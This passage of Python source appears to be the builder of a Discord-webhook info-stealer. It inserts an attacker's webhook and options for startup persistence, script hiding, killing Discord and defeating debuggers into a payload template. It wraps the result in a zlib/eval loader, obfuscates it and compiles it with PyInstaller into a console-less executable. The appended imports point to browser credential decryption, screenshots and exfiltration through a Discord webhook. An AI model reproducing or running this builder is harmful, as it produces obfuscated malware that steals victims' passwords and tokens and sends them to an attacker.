        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%WEBHOOK_HERE%', webhook)
                    .replace("%ping_enabled%", str(self.ping))
                    .replace("%ping_type%", self.pingtype)
                    .replace("%_error_enabled%", str(self.error))
                    .replace("%_startup_enabled%", str(self.startup))
                    .replace("%_hide_script%", str(self.hider))
                    .replace("'%kill_discord_process%'", str(self.killprocess))
                    .replace("'%_debugkiller%'", str(self.dbugkiller)))

        time.sleep(2)
        print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')

        with open(f"{filename}.py", mode='rb') as f:
            content = f.read()

        print(f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")

        original_size = len(content)
        content = self.compress(content)
        new_size = len(content)

        with open(file='compressed_' + (filename.split('\\')[-1] if '\\' in filename else filename.split('/')[-1]) + '.py', mode='w', encoding='utf-8') as f:
            f.write(content)
            if self.obfuscation == 'no' and self.compy == 'yes':
                f.write("\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64;from tkinter import messagebox;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData")

        print(f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}")

        if self.obfuscation == 'yes' and self.compy == 'yes':
            self.encryption(f"compressed_{filename}")
            self.compile(f"obfuscated_compressed_{filename}")
        elif self.obfuscation == 'no' and self.compy == 'yes':
            self.compile(f"compressed_{filename}")
        elif self.obfuscation == 'yes' and self.compy == 'no':
            self.encryption(f"compressed_{filename}")
        else:
            pass

    def compress(self, content):
        compressed_code = compress(content)
        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"

    def encryption(self, filename):
        print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
        os.system(f"python obfuscation.py {filename}.py")

    def compile(self, filename):
        print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
        if self.icon == 'yes':
            icon = self.icon_name
        else:
            icon = "NONE"
        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
        print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')

    def run(self, filename):
        print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')

        if os.path.isfile(f'./{filename}.exe'):
            os.system(f'start ./{filename}.exe')
        elif os.path.isfile(f'./{filename}.py'):
            os.system(f'python ./{filename}.py')

    def cleanup(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.py', f'./obfuscated_compressed_{filename}.py', f'./compressed_{filename}.py', f'./compressed_{filename}.spec'}

        if self.obfuscation == 'yes' and self.compy == 'no':
            cleans_file.remove(f'./obfuscated_compressed_{filename}.py')
        elif self.obfuscation == 'yes' and self.compy == 'yes':
            cleans_file.add(f'./obfuscated_compressed_{filename}.spec')
        elif self.obfuscation == 'no' and self.compy == 'no':
            cleans_file.remove(f'./{filename}.py')
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue


if __name__ == '__main__':
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system('mode con:cols=212 lines=212')
        os.system("cls")

    Builder()
